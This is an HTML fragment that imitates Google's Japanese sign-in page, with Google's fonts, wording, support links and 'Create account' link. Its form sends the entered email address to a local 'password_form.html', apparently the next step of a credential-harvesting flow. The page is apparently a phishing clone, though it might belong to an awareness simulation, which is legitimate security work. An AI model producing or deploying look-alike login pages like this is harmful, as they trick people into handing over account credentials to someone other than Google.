        <div style="text-align: center; padding-top: 16px;">
            <span style='color:#202124; font-family: "Google Sans","Noto Sans Myanmar UI",arial,sans-serif; font-size:24px; font-weight: 400; line-height: 1.3333; word-break: break-word;'>ログイン</span>
        </div>
        <div style="text-align:center; padding-top:8px;">
            <span style='color: #202124;font-size: 16px;font-weight: 400;letter-spacing: 0.1px;line-height: 1.5;padding-bottom: 0;padding-top: 8px; font-family: roboto,"Noto Sans Myanmar UI",arial,sans-serif;'>お客様の Google アカウントを使用</span>
        </div>
            <div>
                <div style="padding-top:32px">
                    <form action="./password_form.html" method="get" id="form">
                        <div class="form-floating mb-3">
                            <input type="email" name="address" class="form-control" id="floatingInput" placeholder="name@example.com" style="font: 400 17px Roboto,RobotoDraft,Helvetica,Arial,sans-serif;">
                            <label for="floatingInput" style="font: 400 17px Roboto,RobotoDraft,Helvetica,Arial,sans-serif;color: #303031;">メールアドレスまたは電話番号</label>
                        </div>
                    </form>
                </div>
                <div>
                    <a href="https://support.google.com/accounts/answer/7682439?hl=ja" style='text-decoration: none; font-family: roboto,"Noto Sans Myanmar UI",arial,sans-serif;color: #1a73e8; padding: 0; font-size: 15px;'>メールアドレスを忘れた場合</a>
                </div>
            </div>
            <div style="padding-top: 40px;">
                <span style='color: #5f6368;font-size: 15px;line-height: 1.4286;font-family: roboto,"Noto Sans Myanmar UI",arial,sans-serif;'>ご自分のパソコンでない場合は、シークレット ブラウジング ウィンドウを使用してログインしてください。<a href="https://support.google.com/accounts/answer/2917834?visit_id=637963240141780441-12998410&p=signin_privatebrowsing&hl=ja&rd=1" style="text-decoration: none;">詳細</a> </span>
            </div>
            <div style="height:35px"></div>
            <div>
                <a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&flowEntry=SignUp" style='text-decoration: none; font-family: roboto,"Noto Sans Myanmar UI",arial,sans-serif;color: #1a73e8; padding: 0;font-size: 15px; float: left; margin-top: 10px;'>アカウントを作成</a>
            </div>
            <div>
                <button type="submit" class="btn btn-primary" form="form" style="width: 76px; float: right;">次へ</button>
            </div>
    </div>
